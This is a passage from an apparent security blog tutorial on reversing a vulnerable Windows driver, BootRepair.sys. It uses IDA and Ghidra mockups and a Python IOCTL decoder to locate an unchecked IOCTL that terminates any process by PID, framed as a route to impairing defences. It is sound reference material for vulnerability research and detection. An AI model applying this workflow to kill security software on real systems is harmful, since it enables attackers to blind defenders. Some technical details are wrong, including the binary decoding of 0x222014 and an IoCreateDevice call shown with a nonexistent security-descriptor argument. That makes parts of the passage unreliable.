  <text x="481" y="55" font-size="8" fill="#566573">13</text>
  <text x="507" y="55" font-size="8" fill="#566573">12</text>
  <text x="760" y="55" font-size="8" fill="#566573">2</text>
  <text x="774" y="55" font-size="8" fill="#566573">1</text>
  <text x="814" y="55" font-size="8" fill="#566573">0</text>

  <!-- CTL_CODE macro -->
  <rect x="40" y="115" width="390" height="90" fill="#0d1117" rx="5" stroke="#30363d"/>
  <text x="55" y="133" font-size="11" fill="#e6edf3" font-weight="bold">CTL_CODE Macro (WDK — wdm.h)</text>
  <text x="55" y="150" font-size="10" fill="#c39bd3">#define CTL_CODE(DevType, Func, Method, Access) \</text>
  <text x="55" y="165" font-size="10" fill="#c39bd3">  ((DevType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | \</text>
  <text x="55" y="180" font-size="10" fill="#c39bd3">  ((Func) &lt;&lt; 2) | (Method)</text>
  <text x="55" y="197" font-size="10" fill="#82e0aa">// BootRepair.sys: CTL_CODE(0x22, 0x805, 0, 0) = 0x222014</text>

  <!-- Method values -->
  <rect x="450" y="115" width="372" height="90" fill="#0d1117" rx="5" stroke="#30363d"/>
  <text x="465" y="133" font-size="11" fill="#e6edf3" font-weight="bold">Transfer Method (bits 1:0)</text>
  <text x="465" y="150" font-size="10" fill="#e59866">0 = METHOD_BUFFERED     I/O system copies via buffer</text>
  <text x="465" y="165" font-size="10" fill="#7f8c8d">1 = METHOD_IN_DIRECT    MDL for input</text>
  <text x="465" y="180" font-size="10" fill="#7f8c8d">2 = METHOD_OUT_DIRECT   MDL for output</text>
  <text x="465" y="195" font-size="10" fill="#7f8c8d">3 = METHOD_NEITHER      raw user pointers (dangerous)</text>

  <!-- Access field values -->
  <rect x="40" y="218" width="390" height="88" fill="#0d1117" rx="5" stroke="#30363d"/>
  <text x="55" y="236" font-size="11" fill="#e6edf3" font-weight="bold">Access Field (bits 15:14) — Gating Check</text>
  <text x="55" y="253" font-size="10" fill="#e74c3c">0x0 = FILE_ANY_ACCESS     ← BootRepair.sys — UNGATED</text>
  <text x="55" y="268" font-size="10" fill="#7f8c8d">0x1 = FILE_READ_ACCESS    caller needs read access</text>
  <text x="55" y="283" font-size="10" fill="#7f8c8d">0x2 = FILE_WRITE_ACCESS   caller needs write access</text>
  <text x="55" y="298" font-size="10" fill="#27ae60">FILE_ANY_ACCESS = no handle privilege check enforced</text>

  <!-- Binary breakdown -->
  <rect x="450" y="218" width="372" height="88" fill="#0d1117" rx="5" stroke="#30363d"/>
  <text x="465" y="236" font-size="11" fill="#e6edf3" font-weight="bold">0x222014 Decoded</text>
  <text x="465" y="253" font-size="10" fill="#8b949e">Binary: 0010 0010 0010 0000 0001 0000 0001 0100</text>
  <text x="465" y="268" font-size="10" fill="#aed6f1">DevType: 0x0022  Access: 0x0  Func: 0x805  Mth: 0x0</text>
  <text x="465" y="284" font-size="10" fill="#f0b27a">Input buffer: 4 bytes — DWORD PID of target process</text>
  <text x="465" y="299" font-size="10" fill="#e74c3c">No DACL · FILE_ANY_ACCESS · METHOD_BUFFERED</text>

  <text x="430" y="314" font-size="8" fill="#2d3436" text-anchor="middle">benjitrapp.github.io · IOCTL Anatomy · T1068 / T1562.001 🦝</text>
</svg>
</div>

### The CTL_CODE Macro

```c
// Windows Driver Kit — wdm.h
#define CTL_CODE(DeviceType, Function, Method, Access) \
    (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
```

| Field        | Bits  | Description                                                                        |
|--------------|-------|------------------------------------------------------------------------------------|
| `DeviceType` | 31:16 | `0x22` = `FILE_DEVICE_UNKNOWN`, common in exploitable drivers                      |
| `Access`     | 15:14 | `0x0` = `FILE_ANY_ACCESS`. No access check enforced. This is the key gating failure. |
| `Function`   | 12:2  | Vendor-assigned. Values `0x800+` are vendor-defined, not Microsoft-reserved        |
| `Method`     | 1:0   | `0` = `METHOD_BUFFERED`; kernel copies PID via I/O system buffer                  |

The Python utility below decodes any 32-bit control code into its four constituent fields and flags whether the function number is vendor-defined. Paste it into a REPL while triaging a candidate driver.

<div class="ghidra-mock" style="overflow-x:auto;">
  <div class="gm-bar">
    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">ioctl_decoder.py — Python 3.x</span>
  </div>
  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
    <div><span style="color:#484f58;"># CTL_CODE field lookup tables</span></div>
    <div><span style="color:#a78bfa;">METHOD</span><span style="color:#8b949e;"> = [</span><span style="color:#17fe33;">"BUFFERED"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"IN_DIRECT"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"OUT_DIRECT"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"NEITHER"</span><span style="color:#8b949e;">]</span></div>
    <div><span style="color:#a78bfa;">ACCESS</span><span style="color:#8b949e;">  = [</span><span style="color:#17fe33;">"FILE_ANY_ACCESS"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"FILE_READ_ACCESS"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"FILE_WRITE_ACCESS"</span><span style="color:#8b949e;">, </span><span style="color:#17fe33;">"READ+WRITE"</span><span style="color:#8b949e;">]</span></div>
    <div style="margin-top:8px;"><span style="color:#60a5fa;">def </span><span style="color:#fbbf24;">decode_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">code</span><span style="color:#8b949e;">: int) -&gt; dict:</span></div>
    <div style="margin-left:20px;"><span style="color:#60a5fa;">return </span><span style="color:#8b949e;">{</span></div>
    <div style="margin-left:40px;"><span style="color:#17fe33;">"device_type"</span><span style="color:#8b949e;">: </span><span style="color:#fbbf24;">hex</span><span style="color:#8b949e;">((</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">16</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0xFFFF</span><span style="color:#8b949e;">),</span></div>
    <div style="margin-left:40px;"><span style="color:#17fe33;">"access"</span><span style="color:#8b949e;">:      </span><span style="color:#a78bfa;">ACCESS</span><span style="color:#8b949e;">[(</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">14</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0x3</span><span style="color:#8b949e;">],</span></div>
    <div style="margin-left:40px;"><span style="color:#17fe33;">"function"</span><span style="color:#8b949e;">:    </span><span style="color:#fbbf24;">hex</span><span style="color:#8b949e;">((</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">2</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0xFFF</span><span style="color:#8b949e;">),</span></div>
    <div style="margin-left:40px;"><span style="color:#17fe33;">"method"</span><span style="color:#8b949e;">:     </span><span style="color:#60a5fa;">f</span><span style="color:#17fe33;">"METHOD_{</span><span style="color:#a78bfa;">METHOD</span><span style="color:#8b949e;">[</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &amp; </span><span style="color:#f97316;">0x3</span><span style="color:#8b949e;">]</span><span style="color:#17fe33;">}"</span><span style="color:#8b949e;">,</span></div>
    <div style="margin-left:40px;"><span style="color:#17fe33;">"vendor"</span><span style="color:#8b949e;">:     (</span><span style="color:#f97316;">code</span><span style="color:#8b949e;"> &gt;&gt; </span><span style="color:#f97316;">2</span><span style="color:#8b949e;">) &amp; </span><span style="color:#f97316;">0xFFF</span><span style="color:#8b949e;"> &gt;= </span><span style="color:#f97316;">0x800</span><span style="color:#8b949e;">,</span></div>
    <div style="margin-left:20px;"><span style="color:#8b949e;">}</span></div>
    <div style="margin-top:10px;padding-top:10px;border-top:1px solid #21262d;"><span style="color:#484f58;">&gt;&gt;&gt; </span><span style="color:#fbbf24;">decode_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;">)</span></div>
    <div><span style="color:#8b949e;">{</span></div>
    <div style="margin-left:20px;"><span style="color:#17fe33;">'device_type'</span><span style="color:#8b949e;">: </span><span style="color:#17fe33;">'0x22'</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">      # FILE_DEVICE_UNKNOWN</span></div>
    <div style="margin-left:20px;"><span style="color:#17fe33;">'access'</span><span style="color:#8b949e;">:      </span><span style="color:#ef4444;">'FILE_ANY_ACCESS'</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">   # no caller check enforced</span></div>
    <div style="margin-left:20px;"><span style="color:#17fe33;">'function'</span><span style="color:#8b949e;">:    </span><span style="color:#17fe33;">'0x805'</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">           # vendor-defined (>= 0x800)</span></div>
    <div style="margin-left:20px;"><span style="color:#17fe33;">'method'</span><span style="color:#8b949e;">:     </span><span style="color:#17fe33;">'METHOD_BUFFERED'</span><span style="color:#8b949e;">,</span></div>
    <div style="margin-left:20px;"><span style="color:#17fe33;">'vendor'</span><span style="color:#8b949e;">:     </span><span style="color:#60a5fa;">True</span></div>
    <div><span style="color:#8b949e;">}</span></div>
  </div>
</div>

---

### Reversing IOCTLs in IDA Pro

<!-- ============================================================
     DIAGRAM 3a — IDA Pro IOCTL RE Workflow Mockup
     ============================================================ -->
<div style="margin:2rem 0;overflow-x:auto;">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 540" width="100%" style="max-width:900px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
  <rect width="900" height="540" fill="#1e1f29" rx="10"/>
  <!-- IDA title bar -->
  <rect width="900" height="28" fill="#2d2d3f" rx="10"/>
  <rect x="0" y="14" width="900" height="14" fill="#2d2d3f"/>
  <circle cx="16" cy="14" r="6" fill="#ff5f57"/>
  <circle cx="36" cy="14" r="6" fill="#ffbd2e"/>
  <circle cx="56" cy="14" r="6" fill="#28c840"/>
  <text x="450" y="19" font-size="11" fill="#a0a0b0" text-anchor="middle">IDA Pro 9.0 — BootRepair.sys [AMD64]</text>

  <!-- Menu bar -->
  <rect x="0" y="28" width="900" height="22" fill="#252535"/>
  <text x="10" y="43" font-size="10" fill="#8080a0">File  Edit  Jump  Search  View  Debugger  Options  Windows  Help</text>

  <!-- Tabs -->
  <rect x="0" y="50" width="900" height="20" fill="#1e1f29"/>
  <rect x="0" y="50" width="120" height="20" fill="#2a2b3d" stroke="#5c5c7a" stroke-width="1"/>
  <text x="60" y="63" font-size="10" fill="#c8c8e8" text-anchor="middle">IDA View-A</text>
  <rect x="122" y="50" width="100" height="20" fill="#1e1f29"/>
  <text x="172" y="63" font-size="10" fill="#606080" text-anchor="middle">Imports</text>
  <rect x="224" y="50" width="120" height="20" fill="#1e1f29"/>
  <text x="284" y="63" font-size="10" fill="#606080" text-anchor="middle">Strings</text>
  <rect x="346" y="50" width="130" height="20" fill="#1e1f29"/>
  <text x="411" y="63" font-size="10" fill="#606080" text-anchor="middle">Functions</text>

  <!-- Step labels on left side -->
  <rect x="0" y="70" width="38" height="462" fill="#16172080"/>
  <text x="19" y="120" font-size="8" fill="#e74c3c" text-anchor="middle" transform="rotate(-90,19,120)">STEP 1 — imports</text>
  <text x="19" y="235" font-size="8" fill="#e67e22" text-anchor="middle" transform="rotate(-90,19,235)">STEP 2 — xrefs</text>
  <text x="19" y="350" font-size="8" fill="#f1c40f" text-anchor="middle" transform="rotate(-90,19,350)">STEP 3 — dispatch</text>
  <text x="19" y="460" font-size="8" fill="#27ae60" text-anchor="middle" transform="rotate(-90,19,460)">STEP 4 — DriverEntry</text>

  <!-- Main disassembly pane -->
  <rect x="38" y="70" width="580" height="462" fill="#1a1b2a"/>

  <!-- Step 1: Imports window showing dangerous imports -->
  <rect x="46" y="78" width="564" height="95" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"/>
  <text x="55" y="94" font-size="9" fill="#6060a0">; ── Imports (ntoskrnl.exe) ── press X on function to xref ──────────────────</text>
  <text x="55" y="110" font-size="10" fill="#6688cc">.idata:FFFFF80000012010  </text><text x="220" y="110" font-size="10" fill="#e74c3c">ZwTerminateProcess</text><text x="380" y="110" font-size="10" fill="#5c8c5c"> ; ← START HERE</text>
  <text x="55" y="125" font-size="10" fill="#6688cc">.idata:FFFFF80000012018  </text><text x="220" y="125" font-size="10" fill="#e67e22">PsLookupProcessByProcessId</text>
  <text x="55" y="140" font-size="10" fill="#6688cc">.idata:FFFFF80000012020  </text><text x="220" y="140" font-size="10" fill="#e67e22">ObOpenObjectByPointer</text>
  <text x="55" y="155" font-size="10" fill="#6688cc">.idata:FFFFF80000012028  </text><text x="220" y="155" font-size="10" fill="#808080">IoCreateDevice</text>
  <text x="55" y="163" font-size="9" fill="#3a3a6a">; Press [X] on ZwTerminateProcess → shows 1 call site → sub_14000198C</text>

  <!-- Step 2: Xref / termination handler -->
  <rect x="46" y="178" width="564" height="115" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"/>
  <text x="55" y="194" font-size="9" fill="#6060a0">; ── sub_14000198C — termination routine (xref target) ─────────────────────</text>
  <text x="55" y="210" font-size="10" fill="#c678dd">sub_14000198C  proc near</text>
  <text x="55" y="225" font-size="10" fill="#61afef">  mov     </text><text x="120" y="225" font-size="10" fill="#e06c75">rcx, [rsp+8]        </text><text x="295" y="225" font-size="10" fill="#5c8c5c">; PID from SystemBuffer</text>
  <text x="55" y="240" font-size="10" fill="#61afef">  call    </text><text x="120" y="240" font-size="10" fill="#e67e22">PsLookupProcessByProcessId</text><text x="350" y="240" font-size="10" fill="#5c8c5c"> ; → PEPROCESS*</text>
  <text x="55" y="255" font-size="10" fill="#61afef">  call    </text><text x="120" y="255" font-size="10" fill="#e67e22">ObOpenObjectByPointer   </text><text x="335" y="255" font-size="10" fill="#5c8c5c"> ; → hProcess</text>
  <text x="55" y="270" font-size="10" fill="#61afef">  call    </text><text x="120" y="270" font-size="10" fill="#e74c3c">ZwTerminateProcess      </text><text x="335" y="270" font-size="10" fill="#5c8c5c"> ; No PPL check!</text>
  <text x="55" y="281" font-size="9" fill="#3a3a6a">; Press [X] on sub_14000198C → caller is IRP_MJ_DEVICE_CONTROL handler</text>

  <!-- Step 3: IRP dispatch / IOCTL switch -->
  <rect x="46" y="298" width="564" height="115" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"/>
  <text x="55" y="314" font-size="9" fill="#6060a0">; ── IRP_MJ_DEVICE_CONTROL handler — MajorFunction[14] ─────────────────────</text>
  <text x="55" y="330" font-size="10" fill="#c678dd">IrpDispatch  proc near</text>
  <text x="55" y="346" font-size="10" fill="#61afef">  mov     </text><text x="120" y="346" font-size="10" fill="#e06c75">eax, [rdi+70h]      </text><text x="295" y="346" font-size="10" fill="#5c8c5c">; Parameters.DeviceIoControl.IoControlCode</text>
  <text x="55" y="361" font-size="10" fill="#61afef">  cmp     </text><text x="120" y="361" font-size="10" fill="#f1c40f">eax, 222014h        </text><text x="295" y="361" font-size="10" fill="#e74c3c">; ← IOCTL CODE HERE ✓</text>
  <text x="55" y="376" font-size="10" fill="#61afef">  jnz     </text><text x="120" y="376" font-size="10" fill="#808080">loc_unsupported</text>
  <text x="55" y="391" font-size="10" fill="#61afef">  mov     </text><text x="120" y="391" font-size="10" fill="#e06c75">rcx, [rdi+20h]      </text><text x="295" y="391" font-size="10" fill="#5c8c5c">; AssociatedIrp.SystemBuffer → PID ptr</text>
  <text x="55" y="405" font-size="9" fill="#3a3a6a">; Input: [rdi+38h] = InputBufferLength (must be ≥ 4)  No access check before call.</text>

  <!-- Step 4: DriverEntry device path -->
  <rect x="46" y="418" width="564" height="107" fill="#141525" rx="3" stroke="#3a3a5c" stroke-width="1"/>
  <text x="55" y="434" font-size="9" fill="#6060a0">; ── DriverEntry — device name &amp; symbolic link ─────────────────────────────</text>
  <text x="55" y="450" font-size="10" fill="#c678dd">DriverEntry  proc near</text>
  <text x="55" y="466" font-size="10" fill="#61afef">  lea     </text><text x="120" y="466" font-size="10" fill="#98c379">rcx, aDeviceBootrep  </text><text x="310" y="466" font-size="10" fill="#5c8c5c">; L"\Device\BootRepair"</text>
  <text x="55" y="481" font-size="10" fill="#61afef">  call    </text><text x="120" y="481" font-size="10" fill="#808080">IoCreateDevice        </text><text x="295" y="481" font-size="10" fill="#5c8c5c">; NULL SecurityDescriptor → no DACL</text>
  <text x="55" y="496" font-size="10" fill="#61afef">  lea     </text><text x="120" y="496" font-size="10" fill="#98c379">rcx, aDosdevicesBoot </text><text x="310" y="496" font-size="10" fill="#5c8c5c">; L"\DosDevices\BootRepair"</text>
  <text x="55" y="511" font-size="10" fill="#61afef">  call    </text><text x="120" y="511" font-size="10" fill="#808080">IoCreateSymbolicLink  </text><text x="295" y="511" font-size="10" fill="#27ae60">; Win32: \\.\BootRepair ✓</text>
  <text x="55" y="524" font-size="9" fill="#3a3a6a">; [X] on DriverEntry → confirms SecurityDescriptor = NULL in IoCreateDevice call</text>

  <!-- Right panel — legend / notes -->
  <rect x="625" y="70" width="268" height="462" fill="#141525"/>
  <text x="635" y="92" font-size="11" fill="#e6edf3" font-weight="bold">IDA — RE Workflow</text>
  <line x1="635" y1="96" x2="886" y2="96" stroke="#3a3a5c" stroke-width="1"/>

  <text x="635" y="115" font-size="9" fill="#e74c3c" font-weight="bold">① Imports pane</text>
  <text x="635" y="130" font-size="9" fill="#909090">Open View → Open Subviews</text>
  <text x="635" y="145" font-size="9" fill="#909090">→ Imports. Filter for:</text>
  <text x="635" y="160" font-size="9" fill="#e06c75">ZwTerminateProcess</text>
  <text x="635" y="175" font-size="9" fill="#e06c75">MmMapIoSpace</text>
  <text x="635" y="190" font-size="9" fill="#e06c75">ZwWriteVirtualMemory</text>

  <line x1="635" y1="202" x2="886" y2="202" stroke="#2a2a4a" stroke-width="1"/>
  <text x="635" y="220" font-size="9" fill="#e67e22" font-weight="bold">② Cross-reference [X]</text>
  <text x="635" y="235" font-size="9" fill="#909090">Press X on import →</text>
  <text x="635" y="250" font-size="9" fill="#909090">find the calling function.</text>
  <text x="635" y="265" font-size="9" fill="#909090">Rename: F IDA shortcut.</text>
  <text x="635" y="280" font-size="9" fill="#909090">Press X again on caller</text>
  <text x="635" y="295" font-size="9" fill="#909090">to reach IRP handler.</text>

  <line x1="635" y1="307" x2="886" y2="307" stroke="#2a2a4a" stroke-width="1"/>
  <text x="635" y="325" font-size="9" fill="#f1c40f" font-weight="bold">③ IOCTL dispatch</text>
  <text x="635" y="340" font-size="9" fill="#909090">Look for cmp eax, 0x???</text>
  <text x="635" y="355" font-size="9" fill="#909090">constants after loading</text>
  <text x="635" y="370" font-size="9" fill="#909090">IoStackLocation. These</text>
  <text x="635" y="385" font-size="9" fill="#f1c40f">are your IOCTL codes.</text>
  <text x="635" y="400" font-size="9" fill="#909090">Check +38h offset for</text>
  <text x="635" y="415" font-size="9" fill="#909090">InputBufferLength guard.</text>

  <line x1="635" y1="427" x2="886" y2="427" stroke="#2a2a4a" stroke-width="1"/>
  <text x="635" y="445" font-size="9" fill="#27ae60" font-weight="bold">④ DriverEntry strings</text>
  <text x="635" y="460" font-size="9" fill="#909090">View → Strings. Look for</text>
  <text x="635" y="475" font-size="9" fill="#98c379">\Device\*</text>
  <text x="635" y="490" font-size="9" fill="#98c379">\DosDevices\*</text>
  <text x="635" y="505" font-size="9" fill="#909090">xref → IoCreateDevice:</text>
  <text x="635" y="520" font-size="9" fill="#27ae60">NULL SD = no DACL ✓</text>
</svg>
</div>

The IDA cross-reference chain in five steps:

**Step 1: Imports.** `View → Open Subviews → Imports`. Filter for `ntoskrnl.exe` exports. Flag `ZwTerminateProcess`, `MmMapIoSpace`, `PsLookupProcessByProcessId`, `ObOpenObjectByPointer`.

**Step 2: Press `X`.** On the dangerous import, press `X` to list all call sites. The calling function (e.g. `sub_14000198C`) is your termination routine. Rename it `byovd_terminate_process` for clarity.

**Step 3: Follow xrefs up.** Press `X` on your renamed termination function. The caller is the `IRP_MJ_DEVICE_CONTROL` handler. Look for a `cmp eax, 0x???` constant: that is the IOCTL code. Inspect `[rdi+38h]` (InputBufferLength) for size checks and `[rdi+20h]` (SystemBuffer) for the input pointer.

**Step 4: DriverEntry strings.** `View → Open Subviews → Strings`. Filter for `\Device\` and `\DosDevices\`. Cross-reference these strings to `DriverEntry`, find the `IoCreateDevice` call. If the SecurityDescriptor argument is `NULL`, there is no DACL; any caller can open the device.

**Step 5: Confirm device path.** The DosDevices symlink maps directly to the Win32 `\\.\` path you pass to `CreateFile`.

---

### Reversing IOCTLs in Ghidra

<!-- ============================================================
     DIAGRAM 3b — Ghidra IOCTL RE Workflow Mockup
     ============================================================ -->
<div style="margin:2rem 0;overflow-x:auto;">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 560" width="100%" style="max-width:900px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
  <rect width="900" height="560" fill="#2b2b2b" rx="10"/>
  <!-- Ghidra title bar -->
  <rect width="900" height="30" fill="#3c3f41" rx="10"/>
  <rect x="0" y="16" width="900" height="14" fill="#3c3f41"/>
  <circle cx="16" cy="15" r="6" fill="#ff5f57"/>
  <circle cx="36" cy="15" r="6" fill="#ffbd2e"/>
  <circle cx="56" cy="15" r="6" fill="#28c840"/>
  <text x="450" y="20" font-size="11" fill="#bbbbbb" text-anchor="middle">Ghidra 11.3 — CodeBrowser: BootRepair.sys</text>

  <!-- Ghidra menu bar -->
  <rect x="0" y="30" width="900" height="22" fill="#3c3f41"/>
  <text x="10" y="45" font-size="10" fill="#bbbbbb">File  Edit  Analysis  Graph  Navigation  Search  Select  Tools  Window  Help</text>

  <!-- Left panel: Symbol Tree / Functions -->
  <rect x="0" y="52" width="200" height="500" fill="#313335" stroke="#555" stroke-width="0.5"/>
  <text x="10" y="68" font-size="10" fill="#a9b7c6" font-weight="bold">Symbol Tree</text>
  <line x1="0" y1="72" x2="200" y2="72" stroke="#555" stroke-width="1"/>
  <text x="10" y="88" font-size="9" fill="#6a8759">▼ Functions</text>
  <text x="20" y="103" font-size="9" fill="#bbbbbb">DriverEntry</text>
  <text x="20" y="118" font-size="9" fill="#cc7832">IrpDeviceControl</text>
  <text x="30" y="133" font-size="9" fill="#ffc66d">  terminate_proc</text>
  <text x="20" y="148" font-size="9" fill="#bbbbbb">IrpCreate</text>
  <text x="20" y="163" font-size="9" fill="#bbbbbb">IrpClose</text>
  <line x1="0" y1="174" x2="200" y2="174" stroke="#555" stroke-width="0.5"/>
  <text x="10" y="190" font-size="10" fill="#a9b7c6" font-weight="bold">Defined Strings</text>
  <line x1="0" y1="194" x2="200" y2="194" stroke="#555" stroke-width="0.5"/>
  <text x="10" y="210" font-size="9" fill="#6a8759">u"\Device\BootRepair"</text>
  <text x="10" y="225" font-size="9" fill="#6a8759">u"\DosDevices\BootRep"</text>
  <line x1="0" y1="236" x2="200" y2="236" stroke="#555" stroke-width="0.5"/>
  <text x="10" y="252" font-size="10" fill="#a9b7c6" font-weight="bold">Imports</text>
  <line x1="0" y1="256" x2="200" y2="256" stroke="#555" stroke-width="0.5"/>
  <text x="10" y="272" font-size="9" fill="#cc7832">ZwTerminateProcess</text>
  <text x="10" y="287" font-size="9" fill="#cc7832">PsLookupProc…</text>
  <text x="10" y="302" font-size="9" fill="#cc7832">ObOpenObjectBy…</text>
  <text x="10" y="317" font-size="9" fill="#bbbbbb">IoCreateDevice</text>
  <text x="10" y="332" font-size="9" fill="#bbbbbb">IoCreateSymbolicLink</text>

  <!-- Step indicators on far left -->
  <rect x="0" y="52" width="10" height="500" fill="#2b2b2b"/>

  <!-- Main Decompiler pane -->
  <rect x="200" y="52" width="540" height="500" fill="#2b2b2b"/>
  <!-- Sub-tabs -->
  <rect x="200" y="52" width="140" height="20" fill="#4e5254" stroke="#666" stroke-width="0.5"/>
  <text x="270" y="66" font-size="10" fill="#bbbbbb" text-anchor="middle">Decompiler</text>
  <rect x="342" y="52" width="130" height="20" fill="#3c3f41"/>
  <text x="407" y="66" font-size="10" fill="#888" text-anchor="middle">Disassembly</text>
  <rect x="474" y="52" width="130" height="20" fill="#3c3f41"/>
  <text x="539" y="66" font-size="10" fill="#888" text-anchor="middle">Bytes</text>

  <!-- Decompiler output: IrpDeviceControl -->
  <rect x="205" y="76" width="530" height="180" fill="#1e1e1e" rx="3" stroke="#555" stroke-width="0.5"/>
  <text x="215" y="94" font-size="9" fill="#808080">/* IRP_MJ_DEVICE_CONTROL handler — auto-decompiled */</text>
  <text x="215" y="109" font-size="10" fill="#cc7832">NTSTATUS  </text><text x="285" y="109" font-size="10" fill="#ffc66d">IrpDeviceControl</text><text x="390" y="109" font-size="10" fill="#a9b7c6">(PDEVICE_OBJECT dev, PIRP irp)</text>
  <text x="215" y="124" font-size="10" fill="#a9b7c6">{</text>
  <text x="225" y="139" font-size="10" fill="#a9b7c6">  PIO_STACK_LOCATION stack = </text><text x="415" y="139" font-size="10" fill="#cc7832">IoGetCurrentIrpStackLocation</text><text x="605" y="139" font-size="10" fill="#a9b7c6">(irp);</text>
  <text x="225" y="154" font-size="10" fill="#cc7832">  ULONG </text><text x="280" y="154" font-size="10" fill="#a9b7c6">code = stack-&gt;Parameters.DeviceIoControl.</text><text x="530" y="154" font-size="10" fill="#9876aa">IoControlCode</text><text x="625" y="154" font-size="10" fill="#a9b7c6">;</text>
  <text x="225" y="169" font-size="10" fill="#6897bb">  if </text><text x="250" y="169" font-size="10" fill="#a9b7c6">(code == </text><text x="315" y="169" font-size="10" fill="#6a8759">0x222014</text><text x="365" y="169" font-size="10" fill="#a9b7c6">) {                </text><text x="480" y="169" font-size="10" fill="#808080">/* ← IOCTL found */</text>
  <text x="225" y="184" font-size="10" fill="#6897bb">    DWORD </text><text x="278" y="184" font-size="10" fill="#a9b7c6">pid = *(DWORD*)irp-&gt;AssociatedIrp.</text><text x="500" y="184" font-size="10" fill="#9876aa">SystemBuffer</text><text x="580" y="184" font-size="10" fill="#a9b7c6">;</text>
  <text x="225" y="199" font-size="10" fill="#a9b7c6">    </text><text x="240" y="199" font-size="10" fill="#ffc66d">terminate_proc</text><text x="335" y="199" font-size="10" fill="#a9b7c6">(pid);             </text><text x="460" y="199" font-size="10" fill="#808080">/* no size check before call */</text>
  <text x="225" y="214" font-size="10" fill="#a9b7c6">  }</text>
  <text x="225" y="229" font-size="10" fill="#6897bb">  return </text><text x="280" y="229" font-size="10" fill="#9876aa">STATUS_SUCCESS</text><text x="375" y="229" font-size="10" fill="#a9b7c6">;</text>
  <text x="215" y="244" font-size="10" fill="#a9b7c6">}</text>
  <text x="215" y="252" font-size="9" fill="#555">/* Right-click 0x222014 → References → Find References → xref to callers */</text>

  <!-- Decompiler: terminate_proc -->
  <rect x="205" y="262" width="530" height="155" fill="#1e1e1e" rx="3" stroke="#555" stroke-width="0.5"/>
  <text x="215" y="280" font-size="9" fill="#808080">/* terminate_proc — renamed from FUN_14000198c via right-click → Rename Function */</text>
  <text x="215" y="295" font-size="10" fill="#cc7832">NTSTATUS  </text><text x="285" y="295" font-size="10" fill="#ffc66d">terminate_proc</text><text x="380" y="295" font-size="10" fill="#a9b7c6">(DWORD pid)</text>
  <text x="215" y="310" font-size="10" fill="#a9b7c6">{</text>
  <text x="225" y="325" font-size="10" fill="#cc7832">  PEPROCESS </text><text x="300" y="325" font-size="10" fill="#a9b7c6">*proc;</text>
  <text x="225" y="340" font-size="10" fill="#cc7832">  HANDLE    </text><text x="300" y="340" font-size="10" fill="#a9b7c6">hProc;</text>
  <text x="225" y="355" font-size="10" fill="#ffc66d">  PsLookupProcessByProcessId</text><text x="425" y="355" font-size="10" fill="#a9b7c6">((HANDLE)pid, &amp;proc);</text>
  <text x="225" y="370" font-size="10" fill="#ffc66d">  ObOpenObjectByPointer</text><text x="375" y="370" font-size="10" fill="#a9b7c6">(proc, 0, NULL, 0x1FFFFF, *PsProcessType, 0, &amp;hProc);</text>
  <text x="225" y="385" font-size="10" fill="#cc7832">  </text><text x="228" y="385" font-size="10" fill="#ffc66d">ZwTerminateProcess</text><text x="360" y="385" font-size="10" fill="#a9b7c6">(hProc, 0);   </text><text x="480" y="385" font-size="10" fill="#808080">/* PPL irrelevant at Ring 0 */</text>
  <text x="215" y="408" font-size="10" fill="#a9b7c6">}</text>

  <!-- Decompiler: DriverEntry snippet -->
  <rect x="205" y="423" width="530" height="122" fill="#1e1e1e" rx="3" stroke="#555" stroke-width="0.5"/>
  <text x="215" y="441" font-size="9" fill="#808080">/* DriverEntry — device creation and symlink */</text>
  <text x="215" y="456" font-size="10" fill="#cc7832">NTSTATUS  </text><text x="285" y="456" font-size="10" fill="#ffc66d">DriverEntry</text><text x="350" y="456" font-size="10" fill="#a9b7c6">(PDRIVER_OBJECT drv, PUNICODE_STRING reg)</text>
  <text x="215" y="471" font-size="10" fill="#a9b7c6">{</text>
  <text x="225" y="486" font-size="10" fill="#ffc66d">  IoCreateDevice</text><text x="330" y="486" font-size="10" fill="#a9b7c6">(drv, 0, &amp;devName, FILE_DEVICE_UNKNOWN, 0, FALSE,</text>
  <text x="225" y="501" font-size="10" fill="#cc7832">    NULL</text><text x="258" y="501" font-size="10" fill="#a9b7c6">, &amp;devObj);   </text><text x="370" y="501" font-size="10" fill="#cc7832">/* NULL SecurityDesc → no DACL 🚨 */</text>
  <text x="225" y="516" font-size="10" fill="#ffc66d">  IoCreateSymbolicLink</text><text x="375" y="516" font-size="10" fill="#a9b7c6">(&amp;symLink, &amp;devName); </text><text x="530" y="516" font-size="10" fill="#808080">/* \DosDevices\BootRepair */</text>
